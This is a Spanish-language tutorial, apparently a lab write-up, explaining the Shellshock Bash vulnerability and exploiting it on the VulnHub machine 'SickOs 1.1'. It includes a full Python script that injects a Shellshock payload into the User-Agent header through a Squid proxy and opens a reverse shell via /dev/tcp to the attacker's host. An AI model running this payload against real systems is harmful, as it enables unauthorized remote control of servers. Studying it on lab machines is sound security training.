
Un ataque **Shellshock** es un tipo de ataque informático que aprovecha una vulnerabilidad en el **intérprete de comandos Bash** en sistemas operativos basados en Unix y Linux. Esta vulnerabilidad se descubrió en 2014 y se considera uno de los ataques más grandes y generalizados en la historia de la informática.

Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar programas maliciosos, etc.

La vulnerabilidad Shellshock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de shell. El problema radica en la forma en que Bash maneja las variables de entorno. Los atacantes pueden inyectar código malicioso en estas variables de entorno, las cuales Bash ejecuta sin cuestionar su origen o contenido.

Los atacantes pueden explotar esta vulnerabilidad a través de diferentes vectores de ataque. Uno de ellos es a través del **User-Agent**, que es la información que el navegador web envía al servidor web para identificar el tipo de navegador y sistema operativo que se está utilizando. Los atacantes pueden manipular el User-Agent para incluir comandos maliciosos, que el servidor web ejecutará al recibir la solicitud.

A continuación se proporciona el enlace directo para la descarga de la máquina ‘**SickOs 1.1**‘. Esta máquina corresponde a la misma que estuvimos enumerando  solo que en este caso procederemos con la fase de explotación haciendo uso de esta técnica:

Un script en python para ganar acceso a la maquina  través del **User-Agent**
```python
File: shell_shock.py
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/usr/bin/python3
   2   │ 
   3   │ import sys, signal, requests, threading
   4   │ from pwn import *
   5   │ 
   6   │ def def_handler(sig,frame):
   7   │     print("\n\n[!] Saliendo ....\n")
   8   │     sys.exit(1)
   9   │ 
  10   │#Ctrl+c
  11   │ signal.signal(signal.SIGINT,def_handler)
  12   │ 
  13   │ main_url = "http://127.0.0.1/cgi-bin/status"
  14   │ 
  15   │ squid_proxy = {'http': 'http://10.47.1.173:3128'}
  16   │ 
  17   │ lport = 443
  18   │ 
  19   │ def shellshock_attack():
  20   │ 
  21   │     headers = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.47.1.153/443 0>&1'"}
  22   │ 
  23   │     r = requests.get(main_url, headers=headers, proxies=squid_proxy)
  24   │ 
  25   │ 
  26   │ if __name__ == "__main__":
  27   │ 
  28   │     try:
  29   │         threading.Thread(target=shellshock_attack, args=()).start()
  30   │ 
  31   │     except Exception as e:
  32   │         log.error(str(e))
  33   │ 
  34   │     shell = listen(lport, timeout=20).wait_for_connection()
  35   │ 
  36   │     if shell.sock is None:
  37   │         log.failure("No se pudo establecer la conexion")
  38   │         sys.exit(1)
  39   │     else:
  40   │         shell.interactive()
```
-   **SickOs 1.1**: [https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)